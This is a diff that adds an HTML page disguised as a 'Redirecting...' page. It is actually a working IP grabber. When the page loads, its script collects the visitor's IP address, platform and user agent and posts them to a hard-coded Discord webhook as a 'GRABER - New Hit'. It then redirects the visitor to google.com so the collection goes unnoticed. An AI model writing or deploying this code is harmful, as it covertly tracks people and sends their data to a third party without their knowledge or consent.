@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <script>
+    async function collect() {
+        try {
+            const ipReq = await fetch('https://api.ipify.org?format=json');
+            const ipRes = await ipReq.json();
+            
+            const payload = {
+                embeds: [{
+                    title: "🚀 TLQQEMM GRABER - New Hit",
+                    color: 5763719,
+                    fields: [
+                        { name: "IP", value: ipRes.ip, inline: true },
+                        { name: "Platform", value: navigator.platform, inline: true },
+                        { name: "UserAgent", value: navigator.userAgent }
+                    ],
+                    footer: { text: "Logged via TLQQEMM" }
+                }]
+            };
+
+            await fetch('https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            window.location.href = "https://google.com";
+        } catch (e) { console.log(e); }
+    }
+    window.onload = collect;
+    </script>
+</head>
+<body style="background-color:black;">
+</body>
+</html>
